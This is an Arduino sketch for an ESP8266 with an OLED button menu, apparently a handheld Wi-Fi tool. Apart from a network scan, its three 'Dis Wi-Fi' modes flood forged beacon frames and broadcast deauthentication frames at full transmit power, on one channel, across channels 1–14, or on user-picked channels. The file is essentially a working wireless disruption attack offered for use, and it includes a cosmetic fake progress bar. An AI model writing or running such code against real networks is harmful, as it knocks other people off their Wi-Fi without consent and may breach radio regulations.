#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <ESP8266WiFi.h>

extern "C" {
  #include "user_interface.h"
}

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64

#define OLED_SDA 4 // D2
#define OLED_SCL 5 // D1

Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);

#define BTN_UP    14  // D5
#define BTN_DOWN  12  // D6
#define BTN_SELECT 13 // D7

int menuIndex = 0;
const int totalMenus = 4;
String menuItems[totalMenus] = {
  "1. Scan Wi-Fi", 
  "2. Dis Wi-Fi 1", 
  "3. Dis Wi-Fi 1-14",
  "4. Custom Multi-Ch"
};

bool inSubMenu = false;
bool inCustomChSelect = false; 
int selectedChannel = 1;
int customSelectCh = 1;        // 1-14 คือช่อง Wi-Fi, 15 คือปุ่ม START
bool userChannels[15];         

int activeMode = 0; 
bool isLoadingPhase = true; 
unsigned long loadStartTime = 0;
const unsigned long loadDuration = 33000; // เวลาโหลด 33 วินาที

int targetChannels[14];
int numChannels = 0;

uint8_t beaconPacket[128] = {
  0x80, 0x00,                         
  0x00, 0x00,                         
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
  0x1a, 0x2b, 0x3c, 0x4d, 0x5e, 0x6f, 
  0x1a, 0x2b, 0x3c, 0x4d, 0x5e, 0x6f, 
  0x00, 0x00,                         
  
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x64, 0x00,                         
  0x01, 0x00,                         
  
  0x00, 0x00,                         
};

uint8_t deauthPacket[26] = {
  0xC0, 0x00,                         
  0x00, 0x00,                         
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
  0x00, 0x00,                         
  0x07, 0x00                          
};

void setup() {
  Serial.begin(115200);

  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_SELECT, INPUT_PULLUP);

  Wire.begin(OLED_SDA, OLED_SCL);
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    for(;;);
  }

  // เซ็ตสถานะเริ่มต้น: ให้ช่อง 1, 6, 11 เป็น ON ส่วนที่เหลือเป็น OFF
  for(int i = 1; i <= 14; i++) {
    userChannels[i] = false;
  }
  userChannels[1] = true;
  userChannels[6] = true;
  userChannels[11] = true;

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  WiFi.setOutputPower(20.5); 
  delay(100);

  drawMainMenu();
}

void loop() {
  // --- 1. หน้าจอเมนูหลัก ---
  if (!inSubMenu && !inCustomChSelect && activeMode == 0) {
    if (digitalRead(BTN_UP) == LOW) {
      menuIndex--;
      if (menuIndex < 0) menuIndex = totalMenus - 1;
      drawMainMenu();
      delay(250);
    }

    if (digitalRead(BTN_DOWN) == LOW) {
      menuIndex++;
      if (menuIndex >= totalMenus) menuIndex = 0;
      drawMainMenu();
      delay(250);
    }

    if (digitalRead(BTN_SELECT) == LOW) {
      delay(250);
      if (menuIndex == 0) {
        runScanWiFi();
      } else if (menuIndex == 1) {
        inSubMenu = true;
        drawChannelSelect();
      } else if (menuIndex == 2) {
        activeMode = 2; 
        isLoadingPhase = true;
        loadStartTime = millis();
        WiFi.setOutputPower(20.5);
      } else if (menuIndex == 3) {
        inCustomChSelect = true;
        customSelectCh = 1; 
        drawCustomChannelSelect();
        delay(250);
      }
    }
  } 
  // --- 2. หน้าจอเลือก Channel สำหรับฟังก์ชันที่ 2 ---
  else if (inSubMenu && activeMode == 0) {
    if (digitalRead(BTN_UP) == LOW) {
      selectedChannel--;
      if (selectedChannel < 1) selectedChannel = 13;
      drawChannelSelect();
      delay(250);
    }

    if (digitalRead(BTN_DOWN) == LOW) {
      selectedChannel++;
      if (selectedChannel > 13) selectedChannel = 1;
      drawChannelSelect();
      delay(250);
    }

    if (digitalRead(BTN_SELECT) == LOW) {
      delay(400);
      inSubMenu = false;
      activeMode = 1; 
      isLoadingPhase = true;
      loadStartTime = millis();
      
      wifi_set_channel(selectedChannel);
      WiFi.setOutputPower(20.5);
    }
  }
  // --- หน้าจอเลือกหลาย Channel สำหรับฟังก์ชันที่ 4 ---
  else if (inCustomChSelect && activeMode == 0) {
    if (digitalRead(BTN_UP) == LOW) {
      customSelectCh--;
      if (customSelectCh < 1) customSelectCh = 15; 
      drawCustomChannelSelect();
      delay(250);
    }

    if (digitalRead(BTN_DOWN) == LOW) {
      customSelectCh++;
      if (customSelectCh > 15) customSelectCh = 1; 
      drawCustomChannelSelect();
      delay(250);
    }

    if (digitalRead(BTN_SELECT) == LOW) {
      delay(300);
      if (customSelectCh <= 14) {
        userChannels[customSelectCh] = !userChannels[customSelectCh];
        drawCustomChannelSelect();
      } else {
        numChannels = 0;
        for(int i = 1; i <= 14; i++) {
          if(userChannels[i]) {
            targetChannels[numChannels++] = i;
          }
        }
        if(numChannels == 0) {
          targetChannels[0] = 1; 
          numChannels = 1;
        }
        inCustomChSelect = false;
        activeMode = 3; 
        isLoadingPhase = true;
        loadStartTime = millis();
        WiFi.setOutputPower(20.5);
      }
    }
  }
  // --- 3. การทำงานของฟังก์ชันที่ 2 (Dis Wi-Fi 1 / 100 ตัว) ---
  else if (activeMode == 1) {
    if (digitalRead(BTN_SELECT) == LOW) {
      delay(400);
      activeMode = 0;
      drawMainMenu();
      return;
    }

    wifi_set_channel(selectedChannel);
    unsigned long elapsed = millis() - loadStartTime;

    if (isLoadingPhase) {
      if (elapsed >= loadDuration) {
        isLoadingPhase = false; 
      } else {
        int currentProgress = map(elapsed, 0, loadDuration, 1, 100);
        if (currentProgress > 100) currentProgress = 100;

        display.clearDisplay();
        display.setTextSize(1);
        display.setTextColor(SSD1306_WHITE);
        display.setCursor(0, 0);
        display.println(F("== Dis Wi-Fi 1 =="));
        
        display.drawRect(14, 25, 100, 12, SSD1306_WHITE);
        int progressWidth = map(currentProgress, 1, 100, 0, 96);
        display.fillRect(16, 27, progressWidth, 8, SSD1306_WHITE);

        display.setCursor(14, 45);
        display.print(F("Progress: "));
        display.print(currentProgress);
        display.print(F("/100"));
        display.display();
      }
    } else {
      display.clearDisplay();
      display.setTextSize(1);
      display.setCursor(0, 0);
      display.println(F("== Dis Wi-Fi 1 =="));
      display.setCursor(0, 20);
      display.print(F("Channel: "));
      display.println(selectedChannel);
      display.setCursor(0, 45);
      display.println(F("Press SEL to Stop"));
      display.display();
    }

    for (int i = 1; i <= 100; i++) {
      beaconPacket[36] = 0x00; 
      beaconPacket[37] = 0x00; 

      int pos = 38; 
      beaconPacket[pos++] = 0x01; beaconPacket[pos++] = 0x08; 
      beaconPacket[pos++] = 0x82; beaconPacket[pos++] = 0x84; 
      beaconPacket[pos++] = 0x8b; beaconPacket[pos++] = 0x96;
      beaconPacket[pos++] = 0x0c; beaconPacket[pos++] = 0x12; 
      beaconPacket[pos++] = 0x18; beaconPacket[pos++] = 0x24;

      beaconPacket[pos++] = 0x03; beaconPacket[pos++] = 0x01; beaconPacket[pos++] = (uint8_t)selectedChannel; 

      beaconPacket[10] = 0x00; beaconPacket[11] = 0x11; beaconPacket[12] = 0x22;
      beaconPacket[13] = 0x33; beaconPacket[14] = selectedChannel; beaconPacket[15] = i;
      beaconPacket[16] = 0x00; beaconPacket[17] = 0x11; beaconPacket[18] = 0x22;
      beaconPacket[19] = 0x33; beaconPacket[20] = selectedChannel; beaconPacket[21] = i;

      wifi_send_pkt_freedom(beaconPacket, pos, 0);

      deauthPacket[10] = beaconPacket[10]; deauthPacket[11] = beaconPacket[11];
      deauthPacket[12] = beaconPacket[12]; deauthPacket[13] = beaconPacket[13];
      deauthPacket[14] = beaconPacket[14]; deauthPacket[15] = beaconPacket[15];
      deauthPacket[16] = beaconPacket[16]; deauthPacket[17] = beaconPacket[17];
      deauthPacket[18] = beaconPacket[18]; deauthPacket[19] = beaconPacket[19];
      deauthPacket[20] = beaconPacket[20]; deauthPacket[21] = beaconPacket[21];

      wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
      delay(1); 
    }
  }
  // --- 4. การทำงานของฟังก์ชันที่ 3 (Dis Wi-Fi 1-14 / 100 ตัว) ---
  else if (activeMode == 2) {
    if (digitalRead(BTN_SELECT) == LOW) {
      delay(400);
      activeMode = 0;
      drawMainMenu();
      return;
    }

    unsigned long elapsed = millis() - loadStartTime;

    if (isLoadingPhase) {
      if (elapsed >= loadDuration) {
        isLoadingPhase = false; 
      } else {
        int currentProgress = map(elapsed, 0, loadDuration, 1, 100);
        if (currentProgress > 100) currentProgress = 100;

        display.clearDisplay();
        display.setTextSize(1);
        display.setTextColor(SSD1306_WHITE);
        display.setCursor(0, 0);
        display.println(F("== Dis Wi-Fi 1-14 =="));
        
        display.drawRect(14, 25, 100, 12, SSD1306_WHITE);
        int progressWidth = map(currentProgress, 1, 100, 0, 96);
        display.fillRect(16, 27, progressWidth, 8, SSD1306_WHITE);

        display.setCursor(14, 45);
        display.print(F("Progress: "));
        display.print(currentProgress);
        display.print(F("/100"));
        display.display();
      }
    } else {
      display.clearDisplay();
      display.setTextSize(1);
      display.setCursor(0, 0);
      display.println(F("== Dis Wi-Fi 1-14 =="));
      display.setCursor(0, 20);
      display.println(F("Hop CH: 1 to 14"));
      display.setCursor(0, 45);
      display.println(F("Press SEL to Stop"));
      display.display();
    }

    int defaultChannels[] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14};
    for (int i = 1; i <= 100; i++) {
      int currentChannel = defaultChannels[(i - 1) % 14];
      wifi_set_channel(currentChannel);

      beaconPacket[36] = 0x00; 
      beaconPacket[37] = 0x00; 

      int pos = 38;
      beaconPacket[pos++] = 0x01; beaconPacket[pos++] = 0x08; 
      beaconPacket[pos++] = 0x82; beaconPacket[pos++] = 0x84; 
      beaconPacket[pos++] = 0x8b; beaconPacket[pos++] = 0x96;
      beaconPacket[pos++] = 0x0c; beaconPacket[pos++] = 0x12; 
      beaconPacket[pos++] = 0x18; beaconPacket[pos++] = 0x24;

      beaconPacket[pos++] = 0x03; beaconPacket[pos++] = 0x01; beaconPacket[pos++] = (uint8_t)currentChannel; 

      beaconPacket[10] = 0x00; beaconPacket[11] = 0x22; beaconPacket[12] = 0x44;
      beaconPacket[13] = currentChannel; beaconPacket[14] = i; beaconPacket[15] = 0xFF;
      beaconPacket[16] = 0x00; beaconPacket[17] = 0x22; beaconPacket[18] = 0x44;
      beaconPacket[19] = currentChannel; beaconPacket[20] = i; beaconPacket[21] = 0xFF;

      wifi_send_pkt_freedom(beaconPacket, pos, 0);

      deauthPacket[10] = beaconPacket[10]; deauthPacket[11] = beaconPacket[11];
      deauthPacket[12] = beaconPacket[12]; deauthPacket[13] = beaconPacket[13];
      deauthPacket[14] = beaconPacket[14]; deauthPacket[15] = beaconPacket[15];
      deauthPacket[16] = beaconPacket[16]; deauthPacket[17] = beaconPacket[17];
      deauthPacket[18] = beaconPacket[18]; deauthPacket[19] = beaconPacket[19];
      deauthPacket[20] = beaconPacket[20]; deauthPacket[21] = beaconPacket[21];

      wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
      delay(1); 
    }
  }
  // --- 5. การทำงานของฟังก์ชันที่ 4 (Custom Multi-Ch Hop / 100 ตัว) ---
  else if (activeMode == 3) {
    if (digitalRead(BTN_SELECT) == LOW) {
      delay(400);
      activeMode = 0;
      drawMainMenu();
      return;
    }

    unsigned long elapsed = millis() - loadStartTime;

    if (isLoadingPhase) {
      if (elapsed >= loadDuration) {
        isLoadingPhase = false; 
      } else {
        int currentProgress = map(elapsed, 0, loadDuration, 1, 100);
        if (currentProgress > 100) currentProgress = 100;

        display.clearDisplay();
        display.setTextSize(1);
        display.setTextColor(SSD1306_WHITE);
        display.setCursor(0, 0);
        display.println(F("== Custom Multi-Ch =="));
        
        display.drawRect(14, 25, 100, 12, SSD1306_WHITE);
        int progressWidth = map(currentProgress, 1, 100, 0, 96);
        display.fillRect(16, 27, progressWidth, 8, SSD1306_WHITE);

        display.setCursor(14, 45);
        display.print(F("Progress: "));
        display.print(currentProgress);
        display.print(F("/100"));
        display.display();
      }
    } else {
      display.clearDisplay();
      display.setTextSize(1);
      display.setCursor(0, 0);
      display.println(F("== Custom Active =="));
      display.setCursor(0, 20);
      display.println(F("Hopping Custom CH"));
      display.setCursor(0, 45);
      display.println(F("Press SEL to Stop"));
      display.display();
    }

    for (int i = 1; i <= 100; i++) {
      int currentChannel = targetChannels[(i - 1) % numChannels];
      wifi_set_channel(currentChannel);

      beaconPacket[36] = 0x00; 
      beaconPacket[37] = 0x00; 

      int pos = 38;
      beaconPacket[pos++] = 0x01; beaconPacket[pos++] = 0x08; 
      beaconPacket[pos++] = 0x82; beaconPacket[pos++] = 0x84; 
      beaconPacket[pos++] = 0x8b; beaconPacket[pos++] = 0x96;
      beaconPacket[pos++] = 0x0c; beaconPacket[pos++] = 0x12; 
      beaconPacket[pos++] = 0x18; beaconPacket[pos++] = 0x24;

      beaconPacket[pos++] = 0x03; beaconPacket[pos++] = 0x01; beaconPacket[pos++] = (uint8_t)currentChannel; 

      beaconPacket[10] = 0x00; beaconPacket[11] = 0x33; beaconPacket[12] = 0x55;
      beaconPacket[13] = currentChannel; beaconPacket[14] = i; beaconPacket[15] = 0xAA;
      beaconPacket[16] = 0x00; beaconPacket[17] = 0x33; beaconPacket[18] = 0x55;
      beaconPacket[19] = currentChannel; beaconPacket[20] = i; beaconPacket[21] = 0xAA;

      wifi_send_pkt_freedom(beaconPacket, pos, 0);

      deauthPacket[10] = beaconPacket[10]; deauthPacket[11] = beaconPacket[11];
      deauthPacket[12] = beaconPacket[12]; deauthPacket[13] = beaconPacket[13];
      deauthPacket[14] = beaconPacket[14]; deauthPacket[15] = beaconPacket[15];
      deauthPacket[16] = beaconPacket[16]; deauthPacket[17] = beaconPacket[17];
      deauthPacket[18] = beaconPacket[18]; deauthPacket[19] = beaconPacket[19];
      deauthPacket[20] = beaconPacket[20]; deauthPacket[21] = beaconPacket[21];

      wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
      delay(1); 
    }
  }
}

void drawMainMenu() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  
  display.setCursor(0, 0);
  display.println(F("== ESP8266 TOOL =="));

  for (int i = 0; i < totalMenus; i++) {
    display.setCursor(0, 12 + (i * 12));
    if (i == menuIndex) {
      display.print(F("> "));
    } else {
      display.print(F("  "));
    }
    display.println(menuItems[i]);
  }
  display.display();
}

void runScanWiFi() {
  display.clearDisplay();
  display.setCursor(0, 0);
  display.println(F("[ Scanning Wi-Fi... ]"));
  display.display();

  int n = WiFi.scanNetworks();
  
  display.clearDisplay();
  display.setCursor(0, 0);
  
  if (n == 0) {
    display.println(F("No networks found"));
  } else {
    display.print(F("Found: "));
    display.println(n);
    display.println(F("---------------------"));
    
    int showCount = (n > 3) ? 3 : n;
    for (int i = 0; i < showCount; ++i) {
      display.print(i+1);
      display.print(F(". "));
      String ssidStr = WiFi.SSID(i);
      if(ssidStr.length() > 8) ssidStr = ssidStr.substring(0, 8);
      display.print(ssidStr);
      display.print(F(" CH:"));
      display.println(WiFi.channel(i));
    }
  }
  display.println(F("---------------------"));
  display.println(F("Press SELECT to Exit"));
  display.display();

  while (true) {
    if (digitalRead(BTN_SELECT) == LOW) {
      delay(300);
      break;
    }
    yield();
  }
  drawMainMenu();
}

void drawChannelSelect() {
  display.clearDisplay();
  display.setCursor(0, 0);
  display.println(F("[ Select Channel ]"));
  display.setCursor(0, 20);
  display.print(F("Target CH: "));
  display.println(selectedChannel);
  
  display.setCursor(0, 45);
  display.setTextSize(1);
  display.println(F("UP/DOWN:CH | SEL:Start"));
  display.display();
}

void drawCustomChannelSelect() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println(F("Select Channels:"));

  display.setCursor(0, 16);
  if (customSelectCh <= 14) {
    display.print(F("CH "));
    display.print(customSelectCh);
    display.print(F(": "));
    if(userChannels[customSelectCh]) {
      display.println(F("[ON]"));
    } else {
      display.println(F("[OFF]"));
    }
  } else {
    display.println(F("> [ START RUNNING ]"));
  }

  display.setCursor(0, 35);
  display.println(F("UP/DOWN: Move"));
  display.setCursor(0, 48);
  display.println(F("SEL: Toggle / Start"));
  display.display();
}